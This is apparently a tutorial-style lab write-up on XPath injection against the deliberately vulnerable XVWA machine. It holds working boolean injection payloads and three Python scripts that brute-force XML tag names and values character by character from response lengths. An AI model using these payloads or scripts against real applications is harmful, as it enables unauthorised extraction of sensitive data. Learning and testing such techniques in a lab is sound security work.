**XPath** is a query language used in *XML* that allows searching and retrieving specific information from *XML documents*. However, like other programming languages and queries, XPath can also have *vulnerabilities* that attackers can exploit to compromise the security of a web application.

*XPath vulnerabilities* are those that exploit weaknesses in the implementation of XPath queries in a web application. Some common types of XPath vulnerabilities are described below:

- **XPath injection**: attackers can use malicious code injection into XPath queries to alter the expected behavior of the application. For example, they can add a malicious query that retrieves all user information, including sensitive information such as passwords.
- **XPath brute-force**: Attackers can use brute-force techniques to guess XPath paths and retrieve sensitive information. This technique is based on trying different XPath paths until they find one that returns sensitive information.
- **Server information retrieval**: Attackers can use malicious XPath queries to retrieve information about the server, such as the database type, application version, etc. This information can help attackers plan more sophisticated attacks.
- **Manipulation of XPath responses**: Attackers can manipulate the XPath responses of the web application to obtain additional information or alter the behavior of the application. For example, they can modify an XPath response to create a user account without permission.

To protect against XPath vulnerabilities, it is important to validate all user input and avoid dynamic construction of XPath queries. In addition, it is recommended to restrict access permissions to web application resources and to keep software and operating systems up to date. Finally, it is recommended to use security scanning tools and perform regular penetration tests to identify and correct any vulnerabilities in the web application.

# Example

## Setting up the target machine

For the realization of the example we must download and install the following iso in a new virtual machine: [xvwa](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/). We only have to take into account that we must put the network adapter in *bridged* mode and *replicate the connection* in order to be on the same subnet.

Once the other machine is started we are going to add a *new field* to the target *XML*.

Let's navigate to the */var/www/html/xvwa/vulnerabilities/xpath* directory and modify the *coffee.xml* file.

In the *coffee.xml* file we add a new tag "*Secret*" below the *price* of the *first item*, it would look like this:

```xml
<Secret>This is a secret!</Secret>
```

Then we must restart the *Apache* service with the *service apache2 restart* command and we can return to our attacker machine.

## Identifying the target

Once on our machine we must identify the target, for this we will run the **arp-scan** tool and then run a **ping** to check if the machine is active:

```bash
arp-scan -I ens33 --localnet --ignoredups

ping -c 1 192.168.50.122
```

The machine is running and its IP is *192.168.50.122*.

## Exploiting vulnerability

To access the website that is sharing the service we must access *\http://192.168.50.122/xvwa*. Once inside, and to make sure that all the data is correct, click on *Setup / Reset* and then on *Submit / Reset*. Then, we click on *XPATH Injection* to start.

We are going to put in the search field "*1*" so that it filters us by the *coffee* with identifier "*1*" and we are going to pass this request by **BurpSuite**.

In this type of inputs we should test all types of injections, for example [[SQL Injections (SQLI)]] and [[NoSQL Injections]]. When testing these, we see that although they seem to work, they do not give us the relevant data and the query does not seem to work at all. It is then when we should test the *XPath Injections*.

The idea in an *XPath Injection* is to try to discover all existing tags in the target *XML*. The first thing is to find out how many "*primary*" *tags* there are.

```bash
# You must leave an open quotation mark so that the query itself closes it and is correct
# With these queries we are asking for the number of "primary" tags that the XML has, playing with whether it is equal to 5, less than 5, greater than 5, etc...
# If the query is correct, it will show the information, if not, it will not
search=1' and count(/*)='5&submit=
search=1' and count(/*)<'5&submit=
search=1' and count(/*)>'5&submit=
search=1' and count(/*)>='5&submit=
search=1' and count(/*)<='5&submit=
```

After checking the number of "*primary*" tags that the *XML* document has, we see that it is only *1*, so the next step would be to find out what is the *name* of that tag.

To find out what is the *name* of the label we must play with *substrings* as in [[NoSQL Injections]] to find out *character by character* the word:

```bash
# In this case we are telling it that inside the first label (expressed with [1]) we are going to keep the first character, and if this is "C", it will show us the information, if not, it will not
search=1' and substring(name(/*[1]), 1, 1)='C&submit=
```

With these concepts in mind, we can make a *Python* script to help us automate the *brute-force attack* by substituting character for character:

```python
#!/usr/bin/python3

import requests
import time
import sys
import string
import signal

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://192.168.50.122/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():
        data = ""

        p1 = log.progress("Brute force")
        p1.status("Starting brute force attack")

        time.sleep(2)

        p2 = log.progress("Data")
        for position in range(1, 8):
            for character in characters:
                post_data = {
                    'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
                    'submit': ''
                }
                
                r = requests.post(main_url, data=post_data)
                
                if len(r.text) != 8681:
                    data += character
                    p2.status(data)
                    break

        p1.success("Brute force attack ended")
        p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```

With this we have been able to take out the first and only "*primary*" tag of the *XML* file, which is called *Coffees*, so it would look like this:

```xml
<Coffees>
</Coffees>
```

Now we must enumerate the *number of labels* that exist inside the previous discovered label:

```bash
search=1' and count(/*[1]/*)='10&submit=
```

In this case we have *10* tags nested inside the previous one.

The next step would be to find out what is the value of each of the labels, we would follow the logic of the previous example with this syntax:

```bash
# In this case we are telling it that inside the first label (expressed with [1]) and it's first sub-label (expressed with [1] agan), we are going to keep the first character, and if this is "C", it will show us the information, if not, it will not
search=1' and substring(name(/*[1]/*[1]), 1, 1)='C&submit=
```

We can readjust the previous *Python* script so that this time we search one by one for all the nested tags of the previously discovered one:

```python
#!/usr/bin/python3

import requests
import time
import sys
import string
import signal

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://192.168.50.122/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():
    data = ""

    p1 = log.progress("Brute force")
    p1.status("Starting brute force attack")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 7):
        for character in characters:
            post_data = {
                'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s" % (position, character),
                'submit': ''
            }
        
            r = requests.post(main_url, data=post_data)
            
            if len(r.text) != 8686:
                data += character
                p2.status(data)
                break

    p1.success("Brute force attack ended")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```

Resetting the tags that we have discovered our *XML* would look like this:

```xml
<Coffees>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
</Coffees>
```

Once again we must list the number of *sub-labels* and find out the content of each of them:

```bash
search=1' and count(/*[1]/*[1]/*)='5&submit=

search=1' and substring(name(/*[1]/*[1]/*[1]), 1, 1)='I&submit=
```

Now the number of labels we have is *5* in the first sub-label and *4* in the rest.

Let's get the names of all the labels of the first sub-label with this *Python* script:

```python
#!/usr/bin/python3

import requests
import time
import sys
import string
import signal

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://192.168.50.122/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():
    data = ""

    p1 = log.progress("Brute force")
    p1.status("Starting brute force attack")

    time.sleep(2)

    p2 = log.progress("Data")

    for first_position in range(1, 6):
        for second_position in range(1, 21):
            for character in characters:
                post_data = {
                    'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
                    'submit': ''
                }
                
                r = requests.post(main_url, data=post_data)

                if len(r.text) != 8691 and len(r.text) != 8692:
                    data += character
                    p2.status(data)
                    break
        
        if first_position != 5:
            data += ":"

    p1.success("Brute force attack ended")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```

Resetting the tags that we have discovered our *XML* would look like this:

```xml
<Coffees>
	<Coffee>
		<ID></ID>
		<Name></Name>
		<Desc></Desc>
		<Price></Price>
		<Secret></Secret>
	</Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
	<Coffee></Coffee>
</Coffees>
```

To obtain the value of the fields it could be done in the following way:

```bash
# As I am filtering for this product, the "1", when referring to "Secret", will already know that it refers to an attribute of this product and the comparison can be applied directly
search=1' and substring(Secret,1,1)='T&submit=

# We could also see the number of characters in length of the field
search=1' and string-length(Secret)='17&submit=
```

As in the previous examples, you could automate the brute force process by using a *Python* script to obtain the rest of the characters.